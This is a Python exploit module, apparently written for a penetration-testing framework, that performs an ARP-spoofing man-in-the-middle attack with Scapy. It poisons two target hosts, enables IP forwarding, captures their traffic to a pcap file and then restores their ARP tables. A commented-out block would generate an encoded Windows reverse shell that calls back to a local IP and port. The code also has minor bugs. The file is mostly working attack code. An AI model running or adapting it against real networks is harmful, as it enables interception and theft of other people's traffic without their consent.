from Sploit import Sploit
from collections import OrderedDict
from shellcodes.Shellcodes import OSShellcodes
import sys
import argparse
import threading
import time
from logging import getLogger, ERROR
from datetime import datetime
from time import sleep as pause
getLogger('scapy').setLevel(ERROR)
try:
	from scapy.all import *
	conf.verb = 0
except ImportError:
	self.log('[!] Failed to import Scapy')
	sys.exit(1)

INFO = {}
INFO['NAME'] = "MITM"
INFO['DESCRIPTION'] = "MITM attack"
INFO['VENDOR'] = "--"
INFO['CVE Name'] = "--"
INFO['NOTES'] = """
"""
INFO['DOWNLOAD_LINK'] = ""
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = "1.0 30.05.19"
INFO['PATH'] = "/" #folder on website
INFO['AUTHOR'] = "dmts"

OPTIONS = OrderedDict()
OPTIONS["HOST1"] = "192.168.", dict(description = 'Target 1')
OPTIONS["HOST2"] = "192.168.", dict(description = 'Target 2')
OPTIONS["INTERFACE"] = "eth0", dict(description = 'Interface ID')
OPTIONS["TIMER"] = 1, dict(description = 'Time of execution')

class exploit(Sploit):
	def __init__(self,host1="", host2="",interface="",timer=1,logger=None):
		Sploit.__init__(self, logger=logger)
		self.name = INFO['NAME'] 
		self.host1 = host1
		self.host2 = host2
		self.interface = interface
		self.timer = timer
		self.path='/proc/sys/net/ipv4/ip_forward'

	def args(self):
		self.args = Sploit.args(self, OPTIONS)
		self.host1 = self.args.get("HOST1", self.host1)
		self.host2 = self.args.get("HOST2", self.host2)
		self.interface = self.args.get("INTERFACE", self.interface)
		self.timer= int(self.args.get("TIMER", self.timer))

	def LoadMAC(self,target):
		return srp(Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(pdst=target),timeout=10,iface=self.interface)[0][0][1].hwsrc

	def enable(self):
			with open(self.path,'wb') as file:
				file.write('1')
			return 1
	def disable(self):
		with open(self.path,'wb') as file:
			file.write('0')
		return 0

	def capture(self):
		packets = sniff(iface=self.interface,filter="(host {target1} or host {target2}) and not arp".format(target1=self.host1,target2=self.host2),stop_filter=lambda x: x[IP].src=='1.2.3.4')
		file = "captureEAST_"+datetime.now().strftime("%m%d_%H%M")+".pcap"
		wrpcap(file,packets)
		self.log("---> [-] Packets captured on file : "+file)
		pause(2)

	def poison(self,mac):
		send(ARP(op=2,pdst=self.host1,hwdst=mac[0],psrc=self.host2),iface=self.interface)
		send(ARP(op=2,pdst=self.host2,hwdst=mac[1],psrc=self.host1),iface=self.interface)

	def fix(self,mac):
		send(ARP(op=2,pdst=self.host1,hwdst=mac[0],psrc=self.host2,hwsrc=mac[1]),iface=self.interface)
		send(ARP(op=2,pdst=self.host2,hwdst=mac[1],psrc=self.host1,hwsrc=mac[0]),iface=self.interface)


	def run(self):
		self.args()
		self.log('Starting')
		#s = OSShellcodes("WINDOWS", "32bit", '192.168.110.1', 1331)
		#shellcode_type = "reverse"
		#shellcode = s.create_shellcode(shellcode_type,encode="xor", make_exe=1,debug=1,filename="payload")
		######### MAIN CODE ###########
		targets = [self.host1,self.host2]
		self.log('[*] Resolving MAC addresses...')
		try:
			MAC = list(map(lambda x : self.LoadMAC(x),targets))
			self.log('[+] DONE')
		except Exception as e:
			self.log('[!] [FAIL] Failed to resolve MAC adresses : '+ e)
			sys.exit(1)
		try:
			self.log('[*] Enabling IP Forwarding...')
			self.enable()
			self.log('[+] DONE')
		except IOError as e:
			self.log('[!] [FAIL] Failed to enable IP Forwarding : '+ e)
			sys.exit(1)
		x = threading.Thread(target=self.capture, args=())
		x.start()
		self.log('[-] Launching Attack...')
		time_end = time.time() + 60*self.timer
		while time.time() < time_end:
			try:
				self.log('[*] Poison sent to '+targets[0]+' and '+targets[1])
				self.poison(MAC)
			except Exception as e:
				self.log('[!] [FAIL] Failed to poison : '+ e)
				sys.exit(1)
			pause(2)
		self.log('[!] Poison finished')
		send(IP(src='1.2.3.4',dst=targets[0]),iface=self.interface)
		x.join()
		self.log('[-] Fixing Targets...')
		for i in range (0,5):
			try:
				self.fix(MAC)
			except Exception as e:
				self.log("[!] [FAIL] Failed to fix : "+ e)
				sys.exit(1)
			pause(1.5)
		try:
			self.log('[*] Disabling IP Fordwarding...')
			self.disable()
			self.log('[+] DONE')
		except IOError:
			print('[!] [FAIL]')
			sys.exit(1)
		
		

		self.finish(True)

if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit()
    e.run()
